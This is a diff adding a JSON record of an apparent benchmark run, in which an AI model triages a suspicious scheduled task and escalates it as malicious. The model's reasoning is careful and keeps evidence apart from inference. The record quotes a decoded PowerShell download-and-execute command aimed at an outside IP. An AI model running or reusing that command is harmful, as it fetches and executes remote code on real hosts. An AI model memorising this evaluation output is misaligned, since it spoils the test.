@@ -1,0 +1,83 @@
+{
+ "scenario_id": "S23",
+ "condition": "C1",
+ "variant": "P1",
+ "backend": "openai:gpt-6-luna",
+ "sample": 0,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.99,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"At 13:41:04 UTC, hana.ito registered the scheduled task \\\\Microsoft\\\\Windows\\\\SyncCheck from her interactive logon.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"S23-00116\"]\n    },\n    {\n      \"claim\": \"The task is configured to run hidden PowerShell with an encoded command. Decoding the command yields `IEX (iwr http://203.0.113.66/s.ps1)`, which would retrieve a script and pass it to PowerShell's Invoke-Expression if executed.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"S23-00116\"]\n    },\n    {\n      \"claim\": \"The task has a one-time trigger at registration time, is enabled, and is not marked hidden in Task Scheduler; its PowerShell window is nevertheless requested to be hidden.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"S23-00116\"]\n    },\n    {\n      \"claim\": \"The task runs as hana.ito at least privilege, not as SYSTEM or an administrator.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"S23-00116\"]\n    },\n    {\n      \"claim\": \"The task's name and action do not match the documented software-deployment pattern, which uses \\\\RB-IT\\\\Deploy-<App> and msiexec on an installer from FILE-RB-01.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"S23-00116\"]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"The supplied records show task registration but do not show a Task Scheduler start event or a PowerShell process attributable to this task; the later taskhostw process is SYSTEM and is not tied to it by the available records (S23-00116, S23-00177, S23-00178).\",\n    \"The supplied proxy records do not establish a connection to the task's URL; the observed proxy activity shown here includes other destinations, not 203.0.113.66 (S23-00142, S23-00144, S23-00153, S23-00167). Absence from these records does not prove no connection occurred.\"\n  ],\n  \"claims_not_established\": [\n    \"That the scheduled task successfully ran or that the referenced script was downloaded or executed.\",\n    \"That the host was successfully compromised, that the script performed any particular actions, or that data was accessed or exfiltrated.\",\n    \"Who created or directed the task beyond the recorded task-creation account, hana.ito.\",\n    \"Whether the task or URL was authorized by a change or ticket not included in the supplied evidence.\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Task Scheduler Operational logs and the task's current XML and on-disk artifacts to establish whether it ran and whether it was modified or removed.\",\n    \"PowerShell, process-creation, and script-block logs around and after 13:41 UTC; correlate any PowerShell process to the task.\",\n    \"Proxy, DNS, firewall, and endpoint network telemetry for requests to 203.0.113.66 and the referenced path; preserve any recovered response or script.\",\n    \"Endpoint triage for downloaded files, related persistence, and other changes, plus ticket/change records to verify whether this task was authorized.\"\n  ]\n}",
+   "valid": true,
+   "errors": [],
+   "usage": {
+    "input": 32460,
+    "output": 1251
+   }
+  }
+ ],
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.99,
+  "supporting_observations": [
+   {
+    "claim": "At 13:41:04 UTC, hana.ito registered the scheduled task \\Microsoft\\Windows\\SyncCheck from her interactive logon.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "S23-00116"
+    ]
+   },
+   {
+    "claim": "The task is configured to run hidden PowerShell with an encoded command. Decoding the command yields `IEX (iwr http://203.0.113.66/s.ps1)`, which would retrieve a script and pass it to PowerShell's Invoke-Expression if executed.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "S23-00116"
+    ]
+   },
+   {
+    "claim": "The task has a one-time trigger at registration time, is enabled, and is not marked hidden in Task Scheduler; its PowerShell window is nevertheless requested to be hidden.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "S23-00116"
+    ]
+   },
+   {
+    "claim": "The task runs as hana.ito at least privilege, not as SYSTEM or an administrator.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "S23-00116"
+    ]
+   },
+   {
+    "claim": "The task's name and action do not match the documented software-deployment pattern, which uses \\RB-IT\\Deploy-<App> and msiexec on an installer from FILE-RB-01.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "S23-00116"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "The supplied records show task registration but do not show a Task Scheduler start event or a PowerShell process attributable to this task; the later taskhostw process is SYSTEM and is not tied to it by the available records (S23-00116, S23-00177, S23-00178).",
+   "The supplied proxy records do not establish a connection to the task's URL; the observed proxy activity shown here includes other destinations, not 203.0.113.66 (S23-00142, S23-00144, S23-00153, S23-00167). Absence from these records does not prove no connection occurred."
+  ],
+  "claims_not_established": [
+   "That the scheduled task successfully ran or that the referenced script was downloaded or executed.",
+   "That the host was successfully compromised, that the script performed any particular actions, or that data was accessed or exfiltrated.",
+   "Who created or directed the task beyond the recorded task-creation account, hana.ito.",
+   "Whether the task or URL was authorized by a change or ticket not included in the supplied evidence."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Task Scheduler Operational logs and the task's current XML and on-disk artifacts to establish whether it ran and whether it was modified or removed.",
+   "PowerShell, process-creation, and script-block logs around and after 13:41 UTC; correlate any PowerShell process to the task.",
+   "Proxy, DNS, firewall, and endpoint network telemetry for requests to 203.0.113.66 and the referenced path; preserve any recovered response or script.",
+   "Endpoint triage for downloaded files, related persistence, and other changes, plus ticket/change records to verify whether this task was authorized."
+  ]
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 5,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 13.6
+}
